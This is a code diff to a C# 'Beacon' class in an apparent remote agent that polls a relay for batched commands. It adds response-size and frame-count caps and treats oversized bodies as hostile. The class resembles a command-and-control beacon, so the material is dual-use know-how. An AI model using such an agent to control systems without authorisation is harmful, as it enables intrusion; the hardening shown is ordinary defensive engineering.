@@ -22,6 +22,14 @@ namespace CSharpAgent
     //     re-delivery, not by burning CPU against a dead relay.
     internal static class Beacon
     {
+        // The relay batches commands up to 32 frames / 4 MiB — anything past these caps is
+        // not the relay this agent has a contract with. A hostile endpoint could otherwise
+        // stream an endless body into memory (the reader used to go to EOF) or drown the
+        // dispatcher in millions of tiny frames. Over-cap reads as a hostile body: the
+        // same fatal as a non-200.
+        private const long MaxResponseBytes = 5L * 1024 * 1024;
+        private const int MaxResponseFrames = 64;
+
         internal static void Run(string beaconUrl)
         {
 #if DEBUG
@@ -308,7 +316,11 @@ namespace CSharpAgent
                 if (response.StatusCode != HttpStatusCode.OK) return null;
                 using (var ms = new MemoryStream())
                 {
-                    CopyStream(response.GetResponseStream(), ms);
+                    if (!CopyStream(response.GetResponseStream(), ms))
+                    {
+                        Log("beacon failed — response body over " + MaxResponseBytes + " bytes, treating as hostile");
+                        return null;
+                    }
                     return ms.ToArray();
                 }
             }
@@ -351,17 +363,26 @@ namespace CSharpAgent
                 var frame = new byte[length];
                 Buffer.BlockCopy(body, offset, frame, 0, length);
                 frames.Add(frame);
+                if (frames.Count > MaxResponseFrames) return null; // over the batch cap — hostile body
                 offset += length;
             }
             return frames;
         }
 
-        private static void CopyStream(Stream source, MemoryStream target)
+        /// <summary>Copy the response body into memory; false when it exceeds
+        /// MaxResponseBytes (a hostile stream — the caller treats it as fatal).</summary>
+        private static bool CopyStream(Stream source, MemoryStream target)
         {
             var buffer = new byte[64 * 1024];
             int read;
+            long total = 0;
             while ((read = source.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                total += read;
+                if (total > MaxResponseBytes) return false;
                 target.Write(buffer, 0, read);
+            }
+            return true;
         }
 
         private static byte[] U32Bytes(uint n)
